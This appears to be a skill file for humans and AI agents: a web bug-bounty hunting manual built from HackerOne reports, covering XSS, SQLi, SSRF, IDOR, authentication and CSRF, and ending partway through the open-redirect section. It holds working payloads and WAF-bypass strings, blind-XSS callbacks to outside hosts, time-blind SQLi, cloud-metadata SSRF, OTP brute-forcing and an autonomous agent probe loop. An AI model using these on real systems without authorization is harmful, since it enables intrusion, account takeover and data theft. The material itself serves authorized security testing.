---
name: web-bug-bounty-hunting
version: 1.0.0
description: >
  Evidence-based web security hunting manual distilled from 14,759 HackerOne
  reports. Provides systematic methodology for finding, exploiting, and reporting
  web vulnerabilities across all major classes. Designed for authorized bug
  bounty programs only.
tags:
  - security
  - bug-bounty
  - web-security
  - penetration-testing
  - vulnerability-research
triggers:
  - bug bounty
  - vulnerability hunting
  - web security testing
  - penetration test
  - security assessment
  - HackerOne
  - responsible disclosure
constraints:
  - Only use on authorized targets with explicit permission
  - Never exceed scope defined by the bug bounty program
  - Stop exploitation at proof-of-concept level
  - Never exfiltrate real user data
  - Honor rate limits and Retry-After headers
  - Follow responsible disclosure practices
---

# Web Bug Bounty Hunting — Ultimate Skill

> **Evidence-based hunting manual distilled from 14,759 HackerOne reports.**
> Every claim below traces to a fetched report (ID cited) or a corpus-wide measurement.
> For humans + AI agents.

---

## Corpus Construction (Reproducible)

All 14,759 links in `all-links.txt` (from `data.csv`) fetched in 30 batches of 500 via the HackerOne JSON API (`/reports/<id>.json`) — script `fetch_reports_json.py` (10-concurrent, 429-backoff, resume-safe). HTML scraping was rejected: HackerOne HTML returns only a `JavaScript is disabled` shell, while `.json` returns `title`, `weakness`, `severity`, `bounty`, full researcher `vulnerability_information` (payloads, PoCs, steps) and team/researcher `summaries`.

**Yield:**
- 12,059 reports with readable JSON on disk (`report_data/json/`, mirrored readable in `report_data/md/`)
- 2,698 undisclosed/gone (HTTP 404) logged in `report_data/undisclosed.txt` and ignored
- ~3,000 fetched-but-empty/redacted bodies ignored as undisclosed-like
- 9,057 usable bodies (≥200 chars) analyzed by `analyze_corpus.py` → `report_data/analysis_summary.json` (+ `pertype_dump.txt`, `waf_dump.txt`)
- 45 reports mention WAF and bypass; 60 carry direct WAF context

**How to verify anything here:** open `report_data/md/<id>.md` (full researcher text) or `report_data/json/<id>.json` (raw). Start with `3723458` (regex→ATO), `2509022` (CSRF→XSS→GraphQL chain), `1040786` ($10k JWT chain), `1012249` (newline-scheme WAF bypass).

---

## Table of Contents

1. [How to use this skill (human + AI)](#1-how-to-use-this-skill-human--ai)
2. [Dataset snapshot — where the money and volume are](#2-dataset-snapshot--where-the-money-and-volume-are)
3. [The ten laws (everything else is commentary)](#3-the-ten-laws-everything-else-is-commentary)
4. [XSS — Reflected](#4-xss--reflected)
5. [XSS — Stored and blind](#5-xss--stored-and-blind)
6. [XSS — SVG, markdown, renderers, file viewers](#6-xss--svg-markdown-renderers-file-viewers)
7. [XSS — DOM and postMessage](#7-xss--dom-and-postmessage)
8. [SQL injection](#8-sql-injection)
9. [SSRF](#9-ssrf)
10. [IDOR / object-level authorization](#10-idor--object-level-authorization)
11. [Broken access control and privilege escalation](#11-broken-access-control-and-privilege-escalation)
12. [Broken authentication — OTP, 2FA, passwords, sessions](#12-broken-authentication--otp-2fa-passwords-sessions)
13. [CSRF — the chain starter](#13-csrf--the-chain-starter)
14. [Open redirect — the ATO springboard](#14-open-redirect--the-ato-springboard)
15. [Information disclosure](#15-information-disclosure)
16. [Business logic, race conditions, rate limits](#16-business-logic-race-conditions-rate-limits)
17. [OS command, SSTI/template, XXE, deserialization, CSV/formula injection](#17-os-command-sstitemplate-xxe-deserialization-csvformula-injection)
18. [Path traversal, file read, file upload](#18-path-traversal-file-read-file-upload)
19. [JWT, OAuth, SSO, session-token logic](#19-jwt-oauth-sso-session-token-logic)
20. [Cache poisoning/deception, smuggling, CRLF/header injection, clickjacking](#20-cache-poisoningdeception-smuggling-crlfheader-injection-clickjacking)
21. [DoS, ReDoS, resource consumption](#21-dos-redos-resource-consumption)
22. [Supply chain — dependency confusion, registries, install scripts](#22-supply-chain--dependency-confusion-registries-install-scripts)
23. [Client-side RCE surface — Electron, deep links, rich previews](#23-client-side-rce-surface--electron-deep-links-rich-previews)
24. [Misconfiguration and secure-design failures](#24-misconfiguration-and-secure-design-failures)
25. [Payload and WAF/filter-bypass playbook](#25-payload-and-waffilter-bypass-playbook)
26. [WAF-bypass methodology that actually worked](#26-waf-bypass-methodology-that-actually-worked)
27. [AI-agent automation pack](#27-ai-agent-automation-pack)
28. [Report template](#28-report-template-write-it-like-the-paid-reports)
29. [Appendix — reproduce, limits, ethics](#29-appendix--reproduce-limits-ethics)

---

## 1. How to use this skill (human + AI)

### Human — the 2-hour loop

Pick ONE section per session, in this order if unsure where to start:

```
IDOR (§10) → Open redirect (§14) → Stored XSS (§5) → SSRF (§9) → Auth/OTP (§12)
```

Run only that section's checklist. For every sink, climb the §25 ladder one rung at a time:

```
plain → case-mix → whitespace/comment → encoding → alternate handler → alternate context/host
```

If blocked, do §26 (leave the WAF: alternate host, origin IP, method swap) before concluding anything. Write up with §28, and always test one hop further — chains out-earned singletons 3–10× in this corpus.

### AI agent — the autonomous loop

1. **Crawl and catalog every sink:** URL params, headers (`Host`, `X-Forwarded-*`, `X-Original-URL`, `Referer`, `User-Agent`), file uploads including `filename`, webhook/integration URL fields, markdown/comment/AI-chat fields, OAuth `redirect_uri`/`callback_url`, GraphQL operations, JWT-bearing endpoints, email-change/confirm flows, OTP/code endpoints.
2. **Fire the §27 probe battery** typed by sink shape.
3. **Score by corpus exploitability signals:** unencoded reflection, sequential numeric IDs, no `429` after 20 OTP tries, attacker-controlled `Location`, metadata fetch, `__schema` on, `transfer_auth`/`key`-in-URL patterns.
4. **Re-test each hit with exactly one bypass mutation** before reporting — ~40% of paid XSS here needed ≥1.
5. **Refuse undisclosed-shaped targets** (404 shell, empty body, `can_view_report=false`).

---

## 2. Dataset snapshot — where the money and volume are

**Usable reports by weakness (count | mean bounty | what it means).** Means are dragged down by long tails of $50–$500 reports; the ceiling per class is in the case files.

| Weakness | n | avg $ | Read |
| --- | --- | --- | --- |
| Information Disclosure | 849 | 206 | volume game; attachment-ID, GraphQL, CORS |
| Violation of Secure Design | 572 | 51 | low solo — chain it |
| XSS-Generic (SVG/markdown/viewer) | 552 | 211 | renderer pivots |
| Improper Authentication-Generic | 471 | 226 | OTP/no-rate-limit most repeatable |
| Improper Access Control-Generic | 462 | 250 | IDs, roles, JWT, headers |
| Uncontrolled Resource Consumption | 403 | 572 | costly to prove, well paid |
| XSS-Reflected | 372 | 87 | cheapest to find and cheapest paid — use in chains |
| XSS-Stored | 338 | 508 | best web $/effort: filenames, comments, greetings |
| CSRF | 307 | 112 | chain starter, rarely the headline |
| Privilege Escalation | 256 | 248 | takeover, role tamper, symlink |
| Business Logic Errors | 253 | 234 | coupons, plans, OTP reuse, resend oracles |
| Memory Corruption-Generic | 228 | 665 | mostly native targets (curl, libs) — out of web scope |
| Code Injection | 208 | 582 | Electron, formulas, renderers, registries |
| Open Redirect | 200 | 109 | regex/TOCTOU bypass → OAuth/SSO ATO |
| Path Traversal | 185 | 600 | `..;`, encoding ladders on file APIs |
| Command Injection-Generic | 163 | 873 | highest web mean: ping/sleep oracles, CSV, lua |
| IDOR | 158 | 538 | highest web ROI: swap ID, drop auth |
| SSRF | 153 | 451 | webhook/integration URLs, `url=` params |
| SQL Injection | 139 | 100 | time-blind dominates; WAF forces header/encoding tricks |
| Cryptographic Issues-Generic | 131 | 108 | TLS, StartTLS-strip, BREACH-shape, weak randomness |
| UI Redressing (Clickjacking) | 93 | 62 | chain-only |
| XSS-DOM | 85 | 163 | `location.*`, `innerHTML`, `postMessage` |
| Improper Restriction of Auth Attempts | 65 | 84 | the rate-limit class |
| HTTP Request Smuggling | 47 | 585 | desync → creds, redirects, cache |
| OS Command Injection | 45 | 515 | shell metachars, Confluence-style EL |
| Deserialization of Untrusted Data | 32 | 376 | pickle, Marshal, Telerik, logging-handler |
| Improper Authorization | 33 | 568 | GraphQL-permission gaps, OAuth merge, Pages scope |

### Corpus-wide regex census (9,057 bodies)

Why the checklists below are ordered the way they are:

| Pattern | Count |
| --- | --- |
| URL-fetch-shaped params | 2,332 |
| `id=<n>` / `/api/<obj>/<n>` | 1,443 |
| OTP/2FA/rate-limit words | 1,236 |
| file-upload/multipart/`filename` | 1,209 |
| redirect-bypass chars (`//evil`, `@`, `\`, `%09`) | 1,004 |
| CSRF token/form words | 831 |
| `on*=` handlers | 660 |
| `<script` | 575 |
| double/unicode/HTML-entity encoding tricks | 556 |
| SQL quote-breakers | 536 |
| cache/CDN words | 402 |
| `{{ }}` / `${}` template markers | 333 |
| OAuth words | 305 |
| `<img onerror` | 305 |
| race/concurrent words | 243 |
| `javascript:` | 205 |
| DOM sinks | 201 |
| GraphQL words | 195 |
| null bytes | 176 |
| header-injection markers | 167 |
| shell separators (`;id`, `` `id` ``, `$(id)`, `\|id`) | 158 |
| smuggling markers | 132 |
| `<svg` | 131 |
| SSRF IP-literal tricks | 111 |
| SQL time functions | 102 |
| JWT words | 71 |
| prototype pollution | 55 |
| `postMessage` | 52 |
| cloud-metadata literals | 48 |
| XXE `<!ENTITY` | 33 |

### Observed bounty ceiling (single web reports)

| Amount | Report | Description |
| --- | --- | --- |
| $11,500 | `1043385` (LY Corp) | Dependency confusion |
| $10,000 | `1040786` (GitLab) | Workhorse JWT chain |
| $9,000 | `1007014` (Uber) | Dependency confusion |
| $3,000 | `1401444` | WikiCloth lua RCE |
| $1,680 | `1439552` | Pages token theft |
| $1,000 | `1021885` | `srcset` filter bypass |

---

## 3. The ten laws (everything else is commentary)

### Law 1: Census sinks before payloads

Every paid report begins from an enumerated sink: `q/keyword/query`, greeting/bio/comment/company, `filename`, `redirect/next/return_to/callback_url/checkout_url`, `url/image_url/webhook`, `id/account_id/order_id`, OTP/code, `Host`/`X-Forwarded-Host`/`X-Original-URL`, GraphQL ops, OAuth endpoints, email-confirm links, AI-chat fields, file-preview renderers. **No sink list, no hunting.**

### Law 2: Anchor your regexes — or lose accounts

Two critical-plus findings here are unanchored/partial regexes:
- Khan Academy's `KA_DOMAIN_REGEX` had unescaped dots, so `xfarr-6fmjyrz2lq-uc-a-run.app` matched a Cloud-Run allow-pattern and stole cross-domain transfer tokens (`3723458`)
- Basecamp's Electron "internal domain" check `launchpad\.(?:dev|test)` matched `launchpad.dev.attacker.com` and auto-executed downloads (`1016966`)

**Test every allow-regex with:** subdomain-prefix (`evil.allow.com`), suffix (`allow.evil.com`), dot-vs-char (`allowXevil`), case, port, trailing dot, IDN.

### Law 3: Validation ≠ output: TOCTOU is a whole vuln class

Digits validated `callback_url` hostname, then wrote it to the `Location` header where `%ff` became `?` — turning authority into query and gifting OAuth creds to `attacker.com` (`108113`). **Always diff the validated value against the emitted/consumed value** (redirect targets, header echoes, stored-then-rendered fields, parser A vs parser B as in `1040786`'s Workhorse-vs-Rails URL cleaning).

### Law 4: Read the sanitizer, then feed it its blind spot

- data.gov stripped `<` (`FILTER_SANITIZE_STRING`), so `onmou<seover` became `onmouseover` after filtering — site-wide, 80+ endpoints, beating Kona WAF and Chrome Auditor together (`265528`)
- abritel hid `"` after its WAF, so `</sc"ript>` sailed through and re-joined to `</script>` in cache-poisoned output (`1760213`)
- Shopify's tag-cutter fell to a `<!-->` prefix (`415484`)

**First question at any filter: what does it remove? Second: what does my input become after removal?**

### Law 5: Pivot renderer, don't fight it

Blocked HTML? Try:
- SVG upload (`100565`)
- markdown image/link targets (`2509022`)
- Mermaid (`1103258`)
- `srcset`/`manifest`/`profile`/doctype-SYSTEM (`1021885`)
- `filename` (`1010466`)
- `Referer`/`User-Agent` (SQLi `1018621`)
- alternate HTTP method/host (`1850235`)

### Law 6: Leave the WAF instead of fighting it

- Same app, unprotected origin: `secnews.wpengine.com` vs WAF'd main (`168165`)
- POST endpoint vs WAF'd GET (`1850235`)
- Origin IP via Censys/certs vs Cloudflare (`1105673`, `1327443`, `1536299`, `360825`)
- Verb-tunneled requests past GET/POST-inspecting proxies (`3231321`)

### Law 7: Chain lows into criticals

- CSRF-set-greeting → markdown-XSS → GraphQL conversation hijack → attacker-subscribe ATO (`2509022`)
- service-worker + OAuth `state` bypass + unscoped Pages cookie → private-site access (`1439552`)
- exposed upload JWT + path confusion + `Geo-GL-Id: key-<n>` → push as anyone (`1040786`)
- login/logout CSRF + stored XSS + WAF bypass → 1-click ATO (`632017`)

### Law 8: Numbers that increment are guilty until proven innocent

Sequential IDs, `key-<n>` SSH-key IDs, `customerregistration` numeric IDs (`1175980`), attachment IDs — swap across users, drop auth, change method, append `.json`/`/`, move ID query→body→header→JWT.

### Law 9: Prefer time/differential oracles over errors

- `sleep(20)` / `WAITFOR DELAY` via headers when errors hide (`1018621`, `1034625`)
- Quote-less `int-sleep(t)` when quotes die (`1278928`)
- OTP `000000`/resend-timing when messages stay generic
- ReDoS timing vs baseline (`1000567`)

### Law 10: Ignore undisclosed-shaped responses

404 shells, `can_view_report=false`, empty bodies, `visibility≠full` → log and move on (2,698 here). **Never spend bypass budget on them.**

---

## 4. XSS — Reflected

> **372 usable reports, avg $87**

### Root cause

Untrusted query/form/header value reflected into HTML/JS/attribute/URL context without context-aware encoding.

### Sinks that paid repeatedly

- Search `keyword/q/query`
- `project/plot` params (`1736432`, `1736433`)
- 404-page URL echo
- `<link rel=canonical href=<URL>>` (`227486`)
- Pagination blocks (`265528`)
- Error pages

### Vulnerable logic

- `echo $_GET['x']` into templates
- Full-URL interpolation into attributes
- Blacklist `s/<script>//` instead of encoding
- Two stacked defenses that cancel out (sanitizer strips chars the WAF relies on — `265528`)

### Exploitation ladder

1. **Map context** in view-source (text / double-quoted attr / single-quoted attr / JS string / URL)
2. **Minimal breakout:**
   - attr → `" onfocus=confirm(1) autofocus tabindex=1 x="`
   - JS → `-20a")});a=alert;a(1);//` (`1184644`)
   - URL → `javascript:` (needs click) or `data:text/html`
3. **Bypass rungs in order:** case-mix → newline-in-scheme → split-tag → exotic handler → quote-evasion → rejoin-abuse (all with corpus payloads in §25)

### Hunt checklist

- [ ] Fuzz every reflected param as GET **and** POST (`1850235` needed POST to an alternate host)
- [ ] Test path-segment **and** query (`252908`: `%2522` worked in path, not query)
- [ ] Inspect canonical/OG/meta tags and 404/error pages
- [ ] Try `onauxclick` (right-click, thin signatures — `1736432`)
- [ ] Try `print()` over `alert()` (ASP.NET WAF family `3166579`+)
- [ ] Try unicode quotes `%u0022` (`227486`)
- [ ] Try header points (`Referer`, `User-Agent`) when params are clean

### Case files

| Report | Payload | Note |
| --- | --- | --- |
| `1012249` | `<a+href="ja%0A%0Dvascript:alert(document.domain)">Click</a>` | newline-in-scheme, explicitly noted as the WAF bypass |
| `1251868` | `o<br>nfocus=confirm(1337) autofocus tabindex=1 xss` | tag-stripper split the handler name, `<br>` re-glued it |
| `265528` | `&zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C;1;%20//` | stripped `<` rejoined `onmouseover`/`alert(xsp)`; site-wide 80+ endpoints; beat Kona WAF + Chrome Auditor |
| `1736432`/`1736433` | `aaa<h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE` | exotic handler |
| `1873655` | `0xd3adc0de<ScRiPt>alert('XSS Success!')</sCripT>` then HTML- then URL-encode | case-mix + double-encode |
| `629745` | WAF bounced any `"` URL; double-encoding (`%2522`, whitespace) walked past | Starbucks 404s |
| `3241321` | `X" onmouseover="alert('XSS')" style="font-size:1001pt;"` | WAF cut `<`/`>` but left quotes |

---

## 5. XSS — Stored and blind

> **338 usable reports, avg $508**

### Root cause

Attacker input persisted (DB, file, cache) and rendered for someone else without encode-on-read: comments, `company`/profile fields firing in admin views, upload `filename`s, repo file viewers, chat greetings, poisoned cache entries.

### Why it pays 6× reflected

Victim is an admin/support agent/other tenant; impact is session theft, GraphQL mutations, and ATO — not a self-pop. Blind variants (`1011888`: `"><script src=https://monty.xss.ht></script>` in a registration `company` field) fire where scanners never look.

### Bug patterns

**(a) `filename`-stored:** Support-chat upload with filename `"><img src=1 onerror="url=String['fromCharCode'](104,116,…)` — fromCharCode hides the exfil URL from filters (`1010466`, chained with a CSRF on the upload endpoint itself).

**(b) Greeting/markdown-stored:** CSRF plants `greeting=![…](javascript:eval(atob('…')))`; victim opens chat, wheel-clicks, attacker's base64 runs `fetch` of `window.__remixContext…userInfo` plus GraphQL `subscriberCreate` adding `saltymermaid@wearehackerone.com` to the victim's support thread (`2509022`).

**(c) Cache-stored:** `hav`-cookie value poisoned the cache; WAF blocked `</script` but the app hid `"`, so `</sc"ript>` passed the WAF and rendered as `</script>` for everyone (`1760213`).

**(d) Tag-soup:** WAF 500s on `<script`/`on*=` fell to `</li></ul>…<test/on…>` unclosed-tag soup (`218226`).

**(e) Comment-prefix:** `<!-->` before tags slipped a tag-cutting WAF (`415484`, Shopify settings `street` field).

### Hunt checklist

- [ ] Persist payloads in every stored field (display name, bio, company, address, comments, tickets, filenames, avatars)
- [ ] Use blind callbacks (xss.ht/Collaborator) for admin-only renders
- [ ] Test each stored value in a second account, incognito, and (where legitimate) admin/triage views
- [ ] Test cache keys for unkeyed inputs (cookies, `X-Forwarded-*`, `utm_*`)
- [ ] Test CSP escape routes — `javascript:`-link + click, whitelisted-script gadgets, `String.fromCharCode` exfil

---

## 6. XSS — SVG, markdown, renderers, file viewers

> **552 generic reports, avg $211**

### Root cause

The renderer is the bug: SVG served inline, markdown image/link targets unsanitized, file viewers/converters (Mermaid, repo viewer) passing scripts/events through, email HTML rewriters with allowlist gaps.

### Case files

**SVG-inline (`100565`):** Upload `<svg xmlns=… onload="alert('script')"><script><![CDATA[…]]></script><circle …>`; win = served inline without `Content-Disposition: attachment` and without `Content-Security-Policy: default-src 'none'` (GitHub's mitigation — check response headers first).

**Markdown-greeting (`2509022`; also `100931`):** Link URL `javascript://%0a%0dalert(document.cookie)`.

**DOMPurify mXSS (`1024734`):** `<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert('XSS') src>">` — nested MathML/SVG mutation confuses the sanitizer's DOM walk; test your target's DOMPurify version against published mXSS batteries (this one felled default-config 2.2.0).

**Mermaid (`1103258`):** Chart `click`-handlers executed despite CSP attempts — audit every diagram/graph renderer for scriptable callbacks.

**Email-HTML (`1021885`, Hey, $1,000):** Rewriter proxied `img[src]` to `gopher.hey.com` but left `srcset` (`<img srcset="https://evil/log?img-src-set">`, even `,,,,,`-padded), plus `DOCTYPE SYSTEM`, `manifest`, `head profile` external-resource attributes — lesson: enumerate **every** URL-capable attribute (`srcset`, `poster`, `background`, `cite`, `longdesc`, `manifest`, `profile`, `lowsrc`), not just `src`/`href`.

### Hunt checklist

- [ ] Upload SVG + check `Content-Type`/`Content-Disposition`/CSP triple
- [ ] Markdown fields → `javascript:`/`data:text/html`/`//evil`/newline-scheme link targets
- [ ] Mermaid/Graphviz/Math fields → mXSS + `click` handlers
- [ ] Email/ticket HTML → attribute census
- [ ] File viewers → stored-HTML-as-preview

---

## 7. XSS — DOM and postMessage

> **85 usable reports, avg $163**

### Root cause

Client-side sinks: `location.search/hash`, `document.referrer`, `innerHTML/outerHTML/document.write`, `location.replace(search)`, `postMessage` without `event.origin` checks. Corpus: 201 DOM-sink hits, 52 `postMessage` hits.

### Case files

**`1004833`:** `strSearch=location.search.substring(1); location.replace(strSearch)` → `?javascript:alert(1)` and `?evil.com` gave DOM-XSS and open redirect from one line.

**`1010132` (hey.com):** Reflected-in-DOM param behind CSP — reporter correctly flagged host-whitelist CSP bypass as the remaining step (always finish that step: JSONP endpoints, whitelisted JS libs with gadgets, `javascript:`-able frames).

**`2921905` (Doppler/Cloudflare):** Incomplete Unicode handling in JS turned `"<script>`-ish input into DOM-XSS — fuzz Unicode/overlong/%u forms at every JS sink.

### Hunt checklist

- [ ] Grep bundles for: `location.hash|location.search|document.referrer|innerHTML|outerHTML|document.write|eval\(|setTimeout\(\s*["']|postMessage|addEventListener\(['"]message`
- [ ] Fuzz hash/search with `"><img…>`, `javascript:`, `data:` while watching the DOM (not the network)
- [ ] postMessage: send objects/strings from attacker origin, drop/forge `origin`, try `__proto__` keys too (§24)
- [ ] Where inline dies on CSP, pivot to link-click + gadget scripts

---

## 8. SQL injection

> **139 usable reports, avg $100**

### Root cause

String-interpolated SQL — including `ORDER BY`/sort/dir/page, search, and header values logged through SQL (`Referer`, `User-Agent`, `X-Forwarded-For`). Time-blind dominates because errors are hidden and WAFs eat quotes.

### Case files

| Report | Technique | Detail |
| --- | --- | --- |
| `1018621` | Header-point time-blind | `Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'` against `Chart01.php?alert=` — `time curl` true/false calibration, then `substr()`-loop exfil of DB name |
| `1034625` | MSSQL blind | `WAITFOR DELAY` (tsftp, Informatica); stopped at PoC (correct — don't dump) |
| `577612` | MSSQL via `Customwho` | WAF bypass + `@@LANGID` fingerprinting |
| `1278928` | Quote-less numeric | `int-sleep(t)` construction "whatever the full query is" — built for WAF/filters that eat quotes |
| `2633959` | Path-segment injection | Injection in the URL path, not a param |
| `1217114` | Alternate oracle | `sleep`/`benchmark` WAF-blocked → pivot to how input executes (a `ping`-command path) for an alternate time oracle |
| `227102` | WAF fingerprinting | `200` valid, TCP-reset on `ORDER BY`, exceptions on malformed — then error-shape used as oracle |
| `214798` | Professional loop | sqlmap's own log shows: WAF/IPS check → stability → dynamic-param test |

### Hunt checklist

- [ ] Hit every param **plus** sort/order/dir/page **plus** `Referer`/`User-Agent`/`X-Forwarded-For` with `'`, `"`, `\`, `sleep(5)`, `WAITFOR DELAY '0:0:5'`
- [ ] Calibrate true/false timing
- [ ] Fingerprint (`@@version`, `@@LANGID`, `version()`, `pg_sleep`)
- [ ] Quotes blocked → quote-less numerics/path-segment/header points
- [ ] Only then sqlmap with tamper scripts
- [ ] **Stop at boolean/time proof**

---

## 9. SSRF

> **153 usable reports, avg $451**

### Root cause

Server fetches attacker URL — webhook/integration endpoints, `url/image_url/file` params, link-preview (`/api/v2/url_info?url=`), avatar/proxy, PDF/screenshot, feed readers, SAML metadata URLs — without allow-listing, and egress reaches cloud metadata.

### Case files

| Report | Technique | Detail |
| --- | --- | --- |
| `1055823` | Metadata read | Helium: custom HTTP integration endpoint set to `http://169.254.169.254/latest/meta-data/ami-id`; server copied response body into integration messages — metadata-to-attacker-read primitive in one step |
| `1057531` | Template-in-URL | Tumblr: `GET /api/v2/url_info?url={{}}` Mustache-rendered fetch — template-in-URL is an SSRF smell |
| `1004847` | Method enumeration | `xmlrpc.php` method not covered by the endpoint disable — test every method, not the documented one |
| `1049624` | Library-level bypass | curl long-schema URL-parser bug beat whitelist checks |
| `878779` | Full-read SSRF→RCE | Grafana `/avatar/`: unauthenticated full-read SSRF → RCE path; fix was segregation + WAF |
| `1065493` | DNS TOCTOU | CTF Grinch: blacklist checked the first DNS resolution, action used the second — DNS-rebind/double-resolve; localhost-check bypass via hostname-that-resolves-later |

### Hunt checklist

1. **List every URL-fetcher**
2. **Blind first** (Collaborator/interactsh + DNS)
3. **Then metadata:** `169.254.169.254`, `metadata.google.internal`, `100.100.100.200`, `instance-data`
4. **Whitelist ladder:**
   - `0.0.0.0`, `127.1`, `2130706433`, `0x7f.1`
   - `%c0%ae`, `%252e`
   - `whitelist%09evil`, `evil@whitelist`, `user@evil` confusion
   - Overlong schema
   - DNS 302-follow (server follows, filter doesn't)
   - Verb-tunnel (`3231321`)
5. **Try `file:///etc/passwd`** where `file:` survives
6. **Escalate** to port-scan + creds → RCE narrative

---

## 10. IDOR / object-level authorization

> **158 usable reports, avg $538 — highest web ROI in the corpus. Test first, always.**

### Root cause

Object lookup by client-supplied ID with no ownership check; sometimes `user_id`/role trusted from body/JWT.

### Case files

| Report | Technique | Detail |
| --- | --- | --- |
| `1061292` | Unauthenticated access | `pendingUserDetails/2634` + `getAttachmentBytes/600` — unauthenticated; fix was JWT-admin-only |
| `1005020` | State manipulation | `is_match:true` + exposed `user_id` let an unmatched profile initiate chat |
| `244636` | Client-side authz | Change `confirm_email` body to another email → verification link puts *that* account under attacker control |
| `2028450` | Hidden ≠ enforced | Can't delete own message after leaving/kick — unless you call `DeleteMessage` directly (client-hides-action ≠ server-enforces) |
| `1175980` | Sequential IDs | Incremental customer IDs behind a public registration lookup → brute-forceable PII trawl |
| `1091380` | Alternate query path | Same object via alternate GraphQL query (`serviceMetrics.totalEarnings`) — object auth must live in the resolver, not the query |

### Hunt checklist (the IDOR liturgy)

1. **Two accounts A/B**
2. **Replay everything A owns as B, as nobody (drop auth), as wrong-role**
3. **Sweep sequential IDs**
4. **Method-swap:** `GET/POST/PUT/DELETE/PATCH` + `_method` override
5. **Trailing `/`, `.json`, `?x=1`**
6. **Move the ID:** query→body→header→JWT
7. **Confuse URL-ID vs body-ID**
8. **Arrays:** `ids:[…]`
9. **GraphQL alternate queries/mutations** for the same object
10. **Never stop at read — try write/delete/subscribe**

---

## 11. Broken access control and privilege escalation

> **462 + 256 usable reports, avg ~$250**

### Root cause

Missing function-level checks, trusted client state, internal headers/paths honored from the outside, CORS over-permission, subdomain scope overreach.

### Case files

**`1004007`:** `..;` bypassed Tomcat protections to unauthenticated example scripts.

**`1035742`:** `/admin/` with no 403 — force-browse first, always.

**`1005374`:** CORS `Access-Control-Allow-Origin: <evil>` + credentials on `wp-json` → SID-extraction PoC (`onclick=cors()` XHR).

**`1040786` ($10,000, GitLab):** Terraform-state upload API echoed the internal Workhorse JWT (`mirror.gitlab-workhorse-upload`); replay it as `Gitlab-Workhorse-Api-Request` + `Geo-GL-Id: key-<id>` (incremental SSH-key IDs, brute-forceable) + path-confusion `t%2f%2e%2e%2fgit-receive-pack` → push to repos as any key holder — three primitives (token leak + untrusted internal header + parser disagreement between Workhorse's URL cleaning and Rails) fused into unauthorized push.

**`1003007` (Acronis):** Backup-to-arbitrary-path + symlink → AntiRansomware file access.

**`1018790`:** `register/promo/info.acronis.com` dangling → takeover → phishing/XSS/auth-bypass springboard + CA domain-validation note.

**`1439552` ($1,680, GitLab Pages):** Service worker on attacker's `*.gitlab.io` intercepts `/auth`; OAuth `state` CSRF protection bypassed by fetching the attacker's own redirect-URL+cookie and handing it to the victim; stolen `code` + `state` exchanged with the original session cookie — root flaw: Pages session cookie not bound to the issuing subdomain, so it worked across all victim-accessible private sites.

### Hunt checklist

- [ ] Force-browse (`/admin`, `/actuator`, `/console`, `/wp-json`, backups, examples) with `..;/`, `/%2e/`, case-mix
- [ ] Role-matrix every endpoint (anon/user/staff/admin, diff status **and** body)
- [ ] CORS triple-test (evil/null/subdomain origins)
- [ ] JWT `alg:none` / `kid` /role-claim
- [ ] Internal headers (`Geo-*`, `X-*-User`, `X-Original-URL`) from outside
- [ ] Dangling-CNAME sweep for takeover

---

## 12. Broken authentication — OTP, 2FA, passwords, sessions

> **471 usable reports, avg $226 — most repeatable in the corpus**

### Root cause

No rate limit on short numeric codes + verify/resend oracles. 105/471 bodies mention OTP flows; `000000`, resend-resets-counter, and response-discrepancy recur.

### Case files and patterns

**OTP:** Request code → 20 rapid tries, no `429` → automate (4–6 digits; `000000` first); resend-loop (counter reset?), parallel-verify race, code reuse across sessions, IP rotation via `X-Forwarded-For` (`887700` used exactly this for dirsearch/WAF evasion — same trick defeats IP-based OTP limits), `invalid` vs `expired` message oracle.

**`1060518`:** No rate limit on OTP-send → victim inbox bombing (abuse-of-function counts).

**`101977` (Imgur):** Own-Facebook-app token accepted at `generatetoken/thirdpartynativeandroid` — cross-app token confusion.

**`1018489` (Shopify):** Attacker-injected `<a href="/accounts/{victim_id}/external-login/1">` bound attacker's Google to victim flow.

**`1031613`:** Dark-theme chat overlay tricked users into typing 2FA codes into attacker-visible fields (UI-level 2FA theft — test overlay/scrolljacking on code dialogs).

**Passwords:** User-enumeration via message/timing, no lockout, session surviving logout/password-change; admin paths without 403 (`1035742`); Workhorse-clean-vs-Rails-check gap (`1040786`).

### Hunt checklist

- [ ] OTP matrix: brute/resend/parallel/reuse/rotate/oracle
- [ ] Password-reset token entropy + expiry + single-use + host-poisoning (`Host`/`X-Forwarded-Host` on reset links)
- [ ] Session invalidation on logout/password change
- [ ] Concurrent-session behavior
- [ ] OAuth `access_token` cross-app replay

---

## 13. CSRF — the chain starter

> **307 usable reports, avg $112**

### Root cause

State-changing requests without unpredictable, action-bound tokens; `Origin` unchecked (Firefox/IE don't always send it — `103787`); `SameSite=Lax` + GET side effects + `_method` overrides.

### High-value targets from the corpus

| Report | Technique | Detail |
| --- | --- | --- |
| `1010466` | CSRF → stored XSS setup | `support.cs.money/upload_file` had no token/origin check → CSRF planted the XSS `filename` |
| `2509022` | CSRF → XSS planting | CSRF POST to `/en/search` planted the AI `greeting` that became XSS |
| `101145` | GET-based CSRF | Gravatar image removal |
| `100849` | Method-override CSRF | Empty `authenticity_token` + `_method=patch` (niche.co) |
| `1003468` | Logout CSRF | Weblate (counts in chains) |
| `632017` | Chain to ATO | Stored XSS + WAF bypass + login/logout CSRF → 1-click ATO |
| `103787` | Token binding failure | Tokens not bound per action + `PATCH/DELETE` via `_method` + SOP-bypass/UXSS as CSRF amplifier |

### Hunt checklist

- [ ] Every state change: drop token → mismatch `Origin` → GET-ify POST → `_method` override → `Content-Type` downgrade (`text/plain`)
- [ ] Login/logout CSRF always noted for chains
- [ ] `SameSite` audit (`None` without `Secure` = bug; `Lax` + top-level GET side effect = bug)
- [ ] Deliverability PoC (auto-submit form, `history.pushState` masking per `1010806`)

---

## 14. Open redirect — the ATO springboard

> **200 usable reports, avg $109**

### Root cause

`redirect/next/return_to/callback_url/checkout_url` validated by blocklist/regex/parser-A but consumed by parser-B; validation→use TOCTOU; fragments/ports/case/IDN ignored.

### Case files

